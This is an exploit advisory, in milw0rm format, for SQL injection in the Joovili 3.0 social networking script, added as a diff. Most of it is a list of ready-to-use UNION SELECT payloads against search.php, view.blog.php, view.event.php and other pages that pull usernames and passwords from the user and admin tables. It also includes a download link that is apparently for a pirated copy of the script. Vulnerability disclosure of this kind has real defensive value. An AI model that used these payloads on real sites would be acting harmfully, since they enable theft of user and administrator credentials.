@@ -1,0 +1,48 @@
+Joovili <= 3.0 SQL Injection Vulnerability
+
+Author: ~!Dok_tOR!~
+Date found: 27.08.08
+Product: Joovili
+Version: 3.0
+Price: $155  
+URL: www.joovili.com
+Download script: http://rapidshare.com/files/96178834/Joovili.Patch.3.0.1__2.Themes.WST.rar.html
+Vulnerability Class: SQL Injection
+Condition: magic_quotes_gpc = Off
+
+http://localhost/[installdir]/search.php
+
+Search Music:
+
+Exploit 1: 
+
+'+union+select+1,2,3,concat_ws(0x3a,username,password),5,6,7,8+from+joovili_users/*
+
+Exploit 2:
+
+'+union+select+1,2,3,concat_ws(0x3a,admin_username,admin_password),5,6,7,8+from+joovili_admins/*
+
+
+Exploit 1:
+
+http://localhost/[installdir]/view.blog.php?id='+union+select+1,2,concat_ws(0x3a,username,password),user(),version(),6+from+joovili_users/*
+
+Exploit 2:
+
+http://localhost/[installdir]/view.blog.php?id='+union+select+1,2,concat_ws(0x3a,admin_username,admin_password),user(),version(),6+from+joovili_admins/*
+
+Exploit 1:
+
+http://localhost/[installdir]/view.event.php?id='+union+select+1,2,concat_ws(0x3a,username,password),4,5,6,7,8,9,10,11,12,13,14,15+from+joovili_users/*
+
+Exploit 2:
+
+http://localhost/[installdir]/view.event.php?id='+union+select+1,2,concat_ws(0x3a,admin_username,admin_password),4,5,6,7,8,9,10,11,12,13,14,15+from+joovili_admins/*
+
+
+http://localhost/[installdir]/view.group.php?id='+union+select+1,2,user(),4,5,6,7,8,9/*
+http://localhost/[installdir]/view.music.php?id='+union+select+1,2,3,version(),5,6,7,8/*
+http://localhost/[installdir]/view.picture.php?id='+union+select+1,user(),3,4,5,6,7/*
+http://localhost/[installdir]/view.video.php?id='+union+select+1,2,3,user(),5,6,7,8/*
+
+# milw0rm.com [2008-09-27]
